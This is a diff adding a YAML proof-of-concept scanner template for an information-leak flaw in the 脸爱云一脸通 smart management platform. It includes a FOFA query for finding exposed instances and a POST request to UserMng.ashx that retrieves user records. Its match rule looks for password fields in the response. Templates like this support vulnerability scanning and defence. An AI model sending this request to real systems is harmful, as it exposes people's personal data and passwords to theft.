@@ -1,0 +1,19 @@
+id: poc-yaml-lian-ai-yun-usermng-aspx-info-leak
+info:
+  name: 脸爱云一脸通智慧平台 UserMng.ashx 信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: 一脸通智慧管理平台
+  fofa: title="欢迎使用脸爱云 一脸通智慧管理平台"
+requests:
+- method: POST
+  path: /UserMng.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: page=1&arr_search=%7B%22bmmc%22%3A%22%22%2C%22rfzt%22%3A%22%22%2C%22cardid%22%3A%22%22%2C%22klb%22%3A%22%22%2C%22ryxm%22%3A%22%22%2C%22rybh%22%3A%22%22%2C%22sex%22%3A%22%22%2C%22ryzt%22%3A%22%22%2C%22rfoperator%22%3A%22%22%2C%22EngName%22%3A%22%22%2C%22WeChat%22%3A%22%22%2C%22Tel%22%3A%22%22%2C%22groupname%22%3A%22%22%2C%22jituanname%22%3A%22%22%2C%22companyname%22%3A%22%22%2C%22startime%22%3A%22%22%2C%22endtime%22%3A%22%22%2C%22order%22%3A%22khrq+desc%22%7D&funcName=getUserInfo
+  expression: "status_code == 200 && \ncontains(content_type,\"text/plain\") &&\n\
+    contains(body,\"\\\"rows\\\"\") &&\ncontains(body,\"password\") &&\ncontains(body,\"\
+    userCount\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
